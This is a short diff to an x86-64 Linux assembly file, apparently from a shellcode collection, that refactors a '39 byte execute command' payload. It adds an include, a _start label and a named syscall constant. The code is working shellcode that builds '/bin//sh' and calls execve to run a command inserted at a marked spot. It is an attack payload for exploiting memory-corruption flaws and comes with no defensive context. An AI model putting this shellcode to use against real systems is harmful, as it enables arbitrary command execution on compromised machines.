@@ -26,15 +26,22 @@
 ;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
-;    
+;
 
 ; 39 byte execute command for linux/x86-64
 ; odzhan
 
     bits    64
+    %define AMD64
+    %include "include.inc"
 
-    push    59
-    pop     rax              ; rax=sys_execve
+    %ifndef BIN
+      global _start
+    %endif
+
+_start:
+    push    SYS_execve
+    pop     rax
     cdq                      ; penv=0
     mov     rcx, '/bin//sh'
     push    rdx              ; 0
@@ -57,4 +64,3 @@ r_cmd64:                     ; command
 l_cmd64:
     call    r_cmd64
     ; put your command here followed by null terminator
-    
